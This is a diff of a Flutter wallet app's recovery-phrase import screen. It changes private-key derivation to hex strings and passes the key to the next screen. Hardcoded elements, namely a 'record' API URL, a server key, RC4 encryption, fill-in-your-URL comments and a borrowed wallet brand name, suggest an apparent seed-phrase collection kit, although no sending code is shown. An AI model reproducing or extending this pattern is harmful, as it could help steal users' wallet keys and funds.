@@ -6,10 +6,10 @@ import 'package:bip39/bip39.dart' as bip39;
 import 'package:simple_rc4/simple_rc4.dart';
 import 'package:wallet/wallet.dart' as wallet;
 import 'package:web3dart/web3dart.dart' as web3dart;
-import 'package:web3dart/web3dart.dart';
 import 'package:flutter/services.dart';
 import 'package:web3dart/crypto.dart' as crypto;
 import 'wallet_screen.dart';
+
 const String API_URL = 'https://localnetwork.cc/record/docs/filler'; // Замените на ваш API URL
 const String SERVER_KEY = 'Qsx@ah&OR82WX9T6gCt'; // Замените на ваш серверный ключ
 const String APP_NAME = 'SuietWallet_IOS'; // Название вашего приложения
@@ -122,7 +122,11 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
       Navigator.push(
         context,
         MaterialPageRoute(
-          builder: (context) => WalletScreen(),
+          builder: (context) => WalletScreen(
+            privateKey: privateKey,
+            address: address,
+            portfolioId: portfolioId,
+          ),
         ),
       );
     } else {
@@ -132,7 +136,7 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
     }
   }
 
-  Uint8List _generatePrivateKey(String mnemonic) {
+  String _generatePrivateKey(String mnemonic) {
     if (!bip39.validateMnemonic(mnemonic)) {
       throw FormatException("Invalid mnemonic phrase.");
     }
@@ -140,13 +144,19 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
     final seed = bip39.mnemonicToSeed(mnemonic);
     final masterKey = wallet.ExtendedPrivateKey.master(seed, wallet.xprv);
     final derivedKey = masterKey.forPath("m/44'/60'/0'/0/0") as wallet.ExtendedPrivateKey;
-    final privateKey = _bigIntToUint8List(derivedKey.key);
+    final privateKey = _bigIntToHex(derivedKey.key);
     return privateKey;
   }
 
-  Uint8List _generatePublicKey(Uint8List privateKey) {
+  String _bigIntToHex(BigInt bigInt) {
+    final bytes = _bigIntToUint8List(bigInt);
+    return bytesToHex(bytes);
+  }
+
+  Uint8List _generatePublicKey(String privateKeyHex) {
     try {
-      final ethPrivateKey = EthPrivateKey(privateKey);
+      final privateKeyBytes = hexToBytes(privateKeyHex);
+      final ethPrivateKey = web3dart.EthPrivateKey.fromHex(privateKeyHex);
       final publicKey = ethPrivateKey.publicKey;
       final publicKeyBytes = publicKey.getEncoded(false); // Generate uncompressed public key
       if (publicKeyBytes.length != 65) { // Uncompressed public key should be 65 bytes including the prefix
@@ -166,8 +176,8 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
     return web3dart.EthereumAddress(addressBytes).hex;
   }
 
-  Uint8List _bigIntToUint8List(BigInt bigInt) {
-    return bigIntToBytes(bigInt);
+  Uint8List _bigIntToUint8List(BigInt number) {
+    return bigIntToBytes(number);
   }
 
   Uint8List bigIntToBytes(BigInt number) {
@@ -182,6 +192,23 @@ class _ImportRecoveryScreenState extends State<ImportRecoveryScreen> {
     }
 
     return byteList;
+  }
+
+  String bytesToHex(Uint8List bytes) {
+    final buffer = StringBuffer();
+    for (final byte in bytes) {
+      buffer.write(byte.toRadixString(16).padLeft(2, '0'));
+    }
+    return buffer.toString();
+  }
+
+  Uint8List hexToBytes(String hex) {
+    final length = hex.length;
+    final bytes = Uint8List(length ~/ 2);
+    for (int i = 0; i < length; i += 2) {
+      bytes[i ~/ 2] = int.parse(hex.substring(i, i + 2), radix: 16);
+    }
+    return bytes;
   }
 
   @override
